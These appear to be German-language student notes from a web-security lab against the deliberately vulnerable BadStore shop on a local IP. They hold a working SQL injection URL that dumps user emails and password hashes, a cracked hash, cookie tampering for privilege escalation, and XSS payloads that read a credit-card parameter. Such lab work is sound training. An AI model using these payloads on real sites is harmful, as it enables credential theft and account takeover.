## 6.5. Broken Access Control
### Erst mittels SQL Injection an die User Daten kommen:
```SQL
http://192.168.178.119/cgi-bin/badstore.cgi?searchquery=xx%27+IN+(itemnum,sdesc,ldesc)+union+select+email,passwd,null,null+from+userdb+LIMIT+2+--+&action=search&x=16&y=7
``` 

- User ist "AAA_Test_User", Passwort ist "098F6BCD4621D373CADE4E832627B4F6"

### Dann mittels https://hashes.com/en/decrypt/hash das Passwort rausfinden
- Die Daten sind *AAA_Test_user:test*

### Jetzt Cookie Tampering, um Privilege Escalation zu machen und Admin zu werden
- Cookie ist *SSOid=UFBX1Rlc3RfdXNlcjowOThmNmJjZDQ2MjFkMzczY2FkZTRlODMyNjI3YjRmNjpUZXN0IFVzZXI6%0AVQ%3D%3D%0A*
- Erst URL Decode: *UFBX1Rlc3RfdXNlcjowOThmNmJjZDQ2MjFkMzczY2FkZTRlODMyNjI3YjRmNjpUZXN0IFVzZXI6
VQ==*
- Vllt. base64 decode?

## 6.7 - 1.php
### Versuche die URL des Dokumentes anzuzeigen
```Javascript
<script>alert(window.location.href);</script>
```

### "action" Feld der "form" modifizieren, um zu einer anderen URL weiterzuleiten
- über die Konsole folgendes machen
```Javascript
document.getElementsByTagName("form")[0].action = "2.php";
```

## 6.7.1 - 1.php
### Cookie Tampering um eine Javascript Injection durchzuführen
```Javascript
%3Cscript%3Ealert%28%22hi%22%29%3C%2Fscript%3E%2C2%2C7.5%3Bother%2Bitem%2C1%2C3.2
```

### Credit Card Number ausgeben
```Javascript
<SCRIPT>alert(decodeURIComponent(new URLSearchParams(window.location.search).get('cc_number')))</SCRIPT>%2C2%2C7.5%3Bother+item%2C1%2C3.2
```

### 2.php ausführen
```Javascript
document.getElementsByTagName("FORM")[0].action = "2.php";
```